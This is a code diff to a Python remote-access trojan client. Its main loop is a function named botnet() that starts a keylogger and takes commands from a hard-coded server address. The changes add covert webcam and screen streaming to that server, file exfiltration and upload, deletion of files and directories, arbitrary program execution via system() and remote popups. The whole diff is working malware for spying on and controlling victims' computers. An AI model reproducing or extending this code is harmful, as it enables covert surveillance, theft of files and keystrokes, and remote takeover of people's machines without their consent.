@@ -17,8 +17,10 @@ import cv2
 import pyautogui
 from zlib import compress
 import numpy as np
-
+import pickle
+import struct
 from mss import mss
+import threading
 
 
 
@@ -27,21 +29,95 @@ home = getcwd()
 finish_time=22
 
 
-def screenshare():
-	try:
-		while True: 
-			img = pyautogui.screenshot()  
-			frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
-			np.save('h.npy',frame)
-			with open('h.npy','wb') as f:
-				data = f.read(10240)
-				while data:
-					client.send(data)
-					data = f.read(10240)
-			reconnect()
-		
-	except Exception as err:
-		print(err)
+
+
+
+class StreamingClient:
+    def __init__(self,sock):
+        self._configure()
+        self.__running = False
+        self.__client_socket = sock
+
+    def _configure(self):
+        self.__encoding_parameters = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
+
+    def _get_frame(self):
+        return None
+
+    def _cleanup(self):
+        cv2.destroyAllWindows()
+
+    def __client_streaming(self):
+        #self.__client_socket.connect((self.__host, self.__port))
+        while self.__running:
+            frame = self._get_frame()
+            result, frame = cv2.imencode('.jpg', frame, self.__encoding_parameters)
+            data = pickle.dumps(frame, 0)
+            size = len(data)
+
+            try:
+                self.__client_socket.sendall(struct.pack('>L', size) + data)
+            except ConnectionResetError:
+                self.__running = False
+            except ConnectionAbortedError:
+                self.__running = False
+            except BrokenPipeError:
+                self.__running = False
+
+        self._cleanup()
+
+    def start_stream(self):
+
+        if self.__running:
+            print("Client is already streaming!")
+        else:
+            self.__running = True
+            client_thread = threading.Thread(target=self.__client_streaming)
+            client_thread.start()
+
+    def stop_stream(self):
+        if self.__running:
+            self.__running = False
+        else:
+            print("Client not streaming!")
+
+
+class CameraClient(StreamingClient):
+
+    def __init__(self,sock , x_res=1024, y_res=576):
+        self.__x_res = x_res
+        self.__y_res = y_res
+        self.__camera = cv2.VideoCapture(0)
+        super(CameraClient, self).__init__(sock)
+
+    def _configure(self):
+        self.__camera.set(3, self.__x_res)
+        self.__camera.set(4, self.__y_res)
+        super(CameraClient, self)._configure()
+
+    def _get_frame(self):
+        ret, frame = self.__camera.read()
+        return frame
+
+    def _cleanup(self):
+        self.__camera.release()
+        cv2.destroyAllWindows()
+
+
+class ScreenShareClient(StreamingClient):
+    def __init__(self,sock, x_res=1920, y_res=1080):
+        self.__x_res = x_res
+        self.__y_res = y_res
+        super(ScreenShareClient, self).__init__(sock)
+
+    def _get_frame(self):
+        screen = pyautogui.screenshot()
+        frame = np.array(screen)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        frame = cv2.resize(frame, (self.__x_res, self.__y_res), interpolation=cv2.INTER_AREA)
+        return frame
+
+
 
 ######################## connecting to server and other miscalleneous code ########################################
 
@@ -90,20 +166,23 @@ def reconnect():
 
 
 
-def recv_b_file(size=1024):
-	client.send('ready'.encode('utf-8'))
-	name = client.recv(1024).decode('utf-8')
-	client.send('ready'.encode('utf-8'))
-	with open(name,'wb') as f:
-		file_contents = client.recv(size)
-		while file_contents:
-			f.write(file_contents)
+def recv_file(size=1024):
+	try:
+		client.send('ready'.encode('utf-8'))
+		name = client.recv(1024).decode('utf-8')
+		with open(name,'wb') as f:
+			client.send('ready'.encode('utf-8'))
 			file_contents = client.recv(size)
+			while file_contents:
+				f.write(file_contents)
+				file_contents = client.recv(size)
 
-	reconnect()
+		reconnect()
+	except Exception as err:
+		client.send(str(err).encode('utf-8'))
 
 
-def send_b_file(size=1024):
+def send_file(size=1024):
 	try:
 		path = client.recv(1024).decode('utf-8')
 		with open(path,'rb') as f:
@@ -118,37 +197,11 @@ def send_b_file(size=1024):
 		client.send(str(err).encode('utf-8'))
 
 
-def recv_t_file(size=1024):
-	client.send('ready'.encode('utf-8'))
-	name = client.recv(1024).decode('utf-8')
-	client.send('ready'.encode('utf-8'))
-	with open(name,'w') as f:
-		file_contents = client.recv(size).decode('utf-8')
-		while file_contents:
-			if '~~exit~~' in file_contents:
-				f.write(file_contents.replace('~~exit~~',''))
-				break
-			f.write(file_contents)
-			file_contents = client.recv(size).decode('utf-8')
 
-
-def send_t_file(size=1024):
-	try:
-		path = client.recv(1024).decode('utf-8')
-		with open(path,'r') as f:
-			client.send('ready'.encode('utf-8'))
-			file_contents = f.read(size)
-			while file_contents:
-				client.send(file_contents.encode('utf-8'))
-				file_contents = f.read(size)
-		client.send('~~exit~~'.encode('utf-8'))
-	except Exception as err:
-		client.send(str(err).encode('utf-8'))
 
 
 def extract_zip(zip_path,extract_path):
 	with ZipFile(zip_path,'r') as f:
-		client.send('ready'.encode('utf-8'))
 		if extract_path=='blank':
 			f.extractall()
 		else:
@@ -240,7 +293,15 @@ def keyboard(option,size=1024):
 	client.send('ready'.encode('utf-8'))
 	if option==1:
 		name = 'script.pyw'
-		recv_t_file(name)
+		client.send('ready'.encode('utf-8'))
+		with open(name,'w') as f:
+			file_contents = client.recv(size).decode('utf-8')
+			while file_contents:
+				if '~~exit~~' in file_contents:
+					f.write(file_contents.replace('~~exit~~',''))
+					break
+				f.write(file_contents)
+				file_contents = client.recv(size).decode('utf-8')
 		system(name)
 		remove(name)
 
@@ -301,21 +362,25 @@ def keylogger():
 
 
 def popup():
-	root = Tk()
-	root.withdraw()
-	client.send('s'.encode('utf-8'))
-	title   = client.recv(1024).decode('utf-8')
-	client.send('s'.encode('utf-8'))
-	message = client.recv(1024).decode('utf-8')
-	client.send('s'.encode('utf-8'))
-	ptype   = client.recv(1024).decode('utf-8')
-	client.send('s'.encode('utf-8'))
-	if ptype=='error':
-		messagebox.showerror(title,message)
-	elif ptype=='warning':
-		messagebox.showwarning(title,message)
-	elif ptype=='info':
-		messagebox.showinfo(title,message)
+	try:
+		root = Tk()
+		root.withdraw()
+		client.send('s'.encode('utf-8'))
+		title   = client.recv(1024).decode('utf-8')
+		client.send('s'.encode('utf-8'))
+		message = client.recv(1024).decode('utf-8')
+		client.send('s'.encode('utf-8'))
+		ptype   = client.recv(1024).decode('utf-8')
+		client.send('s'.encode('utf-8'))
+		if ptype=='error':
+			messagebox.showerror(title,message)
+		elif ptype=='warning':
+			messagebox.showwarning(title,message)
+		elif ptype=='info':
+			messagebox.showinfo(title,message)
+		client.send('success'.encode('utf-8'))
+	except Exception as err:
+		client.send(str(err).encode('utf-8'))
 
 
 
@@ -356,7 +421,8 @@ def popup():
 
 def botnet():
 	global client,HOST,PORT,finish_time,t1
-	HOST,PORT = server_ip('server_address')
+	#HOST,PORT = server_ip('server_address')
+	HOST,PORT = '192.168.29.98',5067
 	crash_in = 100
 	t1 = Thread(target=keylogger)
 
@@ -372,33 +438,35 @@ def botnet():
 		if crash_in==0:
 			break
 
-		if server_command=='send binary file':
-			recv_b_file()
+		if server_command=='send file':
+			recv_file()
 
-		elif server_command=='send text file':
-			recv_t_file()
+		elif server_command=='recieve file':
+			send_file()
 
-		elif server_command=='recieve binary file':
-			send_b_file()
-
-		elif server_command=='recieve text file':
-			send_t_file()
 
 		elif server_command=='extract zip':
-			client.send('ready'.encode('utf-8'))
-			zip_path = client.recv(1024).decode('utf-8')
-			extract_path = client.recv(1024).decode('utf-8')
-			tz = Thread(target=extract_zip,args=(zip_path,extract_path))
-			tz.start()
+			try:
+				client.send('ready'.encode('utf-8'))
+				zip_path = client.recv(1024).decode('utf-8')
+				client.send('ready'.encode('utf-8'))
+				extract_path = client.recv(1024).decode('utf-8')
+				tz = Thread(target=extract_zip,args=(zip_path,extract_path))
+				tz.start()
+			except:
+				pass
 
 		elif server_command=='archive directory':
-			client.send('ready'.encode('utf-8'))
-			folder = client.recv(1024).decode('utf-8')
-			client.send('ready'.encode('utf-8'))
-			zip_name = client.recv(1024).decode('utf-8')
-			
-			ta = Thread(target=archive,args=(folder,zip_name))
-			ta.start()
+			try:
+				client.send('ready'.encode('utf-8'))
+				folder = client.recv(1024).decode('utf-8')
+				client.send('ready'.encode('utf-8'))
+				zip_name = client.recv(1024).decode('utf-8')
+				client.send('ready'.encode('utf-8'))
+				ta = Thread(target=archive,args=(folder,zip_name))
+				ta.start()
+			except:
+				pass
 
 		elif server_command=='screenshot':
 			screenshot()
@@ -406,40 +474,27 @@ def botnet():
 		elif server_command=='take picture':
 			take_picture()
 
+		elif server_command=='stream screen':
+			sc = ScreenShareClient(client)
+			sc.start_stream()
+
+		elif server_command=='stream cam':
+			sc = CameraClient(client)
+			sc.start_stream()
+
+		elif server_command=='stop screenshare':
+			try:
+				sc.stop_stream()
+			except Exception as e:
+				print(e)
+
+		elif server_command=='stop camshare':
+			try:
+				sc.stop_stream()
+			except Exception as e:
+				print(e)
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-			
 
 
 
@@ -463,19 +518,31 @@ def botnet():
 			client.send(getcwd().encode('utf-8'))
 
 		elif server_command=='make directory':
-			client.send('ready'.encode('utf-8'))
-			directory = client.recv(1024).decode('utf-8')
-			mkdir(directory)
+			try:
+				client.send('ready'.encode('utf-8'))
+				directory = client.recv(1024).decode('utf-8')
+				mkdir(directory)
+				client.send('success'.encode('utf-8'))
+			except Exception as err:
+				client.send(str(err).encode('utf-8'))
 
 		elif server_command=='remove file':
-			client.send('ready'.encode('utf-8'))
-			file = client.recv(1024).decode('utf-8')
-			remove(file)
+			try:
+				client.send('ready'.encode('utf-8'))
+				file = client.recv(1024).decode('utf-8')
+				remove(file)
+				client.send('success'.encode('utf-8'))
+			except Exception as err:
+				client.send(str(err).encode('utf-8'))
 
 		elif server_command=='remove directory':
-			client.send('ready'.encode('utf-8'))
-			directory = client.recv(1024).decode('utf-8')
-			rmtree(directory)
+			try:
+				client.send('ready'.encode('utf-8'))
+				directory = client.recv(1024).decode('utf-8')
+				rmtree(directory)
+				client.send('success'.encode('utf-8'))
+			except Exception as err:
+				client.send(str(err).encode('utf-8'))
 
 
 
@@ -496,14 +563,11 @@ def botnet():
 		elif server_command=='open':
 			try:
 				client.send('ready'.encode('utf-8'))
-				path = client.recv(1024).decode('utf-8')
-				current_path = getcwd()
-				file = basename(path)
-				chdir(path.replace(file,''))
+				file = client.recv(1024).decode('utf-8')
 				system(file)
-				chdir(current_path)
-			except:
-				pass
+				client.send('success'.encode('utf-8'))
+			except Exception as err:
+				client.send(str(err).encode('utf-8'))
 
 		elif server_command=='popup':
 			popup()
